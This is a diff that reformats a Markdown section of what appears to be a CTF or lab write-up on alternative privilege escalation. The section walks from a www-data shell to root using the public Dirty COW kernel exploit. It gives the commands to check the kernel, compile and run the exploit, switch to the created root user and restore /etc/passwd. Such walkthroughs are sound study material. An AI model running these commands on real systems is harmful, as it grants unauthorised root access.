@@ -1,19 +1,29 @@
-*ALTERNATIVE PRIV ESC*
+# ALTERNATIVE PRIV ESC
 
 Once we are in the system as www-data, we can check the kernel version using the following command 
 
-```uname -a```
+```
+uname -a
+```
 
 After a short search, we find that there are some kernel exploits which could work here. One of them is Dirty COW, we will use this one https://github.com/firefart/dirtycow
 
 We compile it using the following command
 
-```cd /tmp && gcc -pthread dirty.c -o dirty -lcrypt && ./dirty rootpass```
+```
+cd /tmp && gcc -pthread dirty.c -o dirty -lcrypt && ./dirty rootpass
+```
 
 We log in as root (now named firefart)
 
-```su firefart```
+```
+su firefart
+```
 
-```mv /tmp/passwd.bak /etc/passwd```
+```
+mv /tmp/passwd.bak /etc/passwd
+```
 
-```id```
+```
+id
+```
